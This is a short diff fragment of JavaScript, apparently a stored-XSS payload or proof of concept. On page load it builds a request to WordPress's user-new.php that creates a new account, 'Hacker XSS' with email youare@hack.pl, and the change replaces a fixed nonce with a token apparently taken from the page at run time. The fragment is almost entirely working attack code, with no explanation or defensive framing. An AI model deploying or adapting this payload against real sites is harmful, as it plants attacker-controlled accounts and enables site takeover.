@@ -9,7 +9,7 @@ window.addEventListener('DOMContentLoaded', (event) => {
 			let form = new FormData();
 
 			form.append("action", "createuser");
-			form.append("_wpnonce_create-user", "f3289a98ca");
+			form.append("_wpnonce_create-user", token);
 			form.append("_wp_http_referer", "/wp-admin/user-new.php");
 			form.append("user_login", "Hacker XSS");
 			form.append("email", "youare@hack.pl");
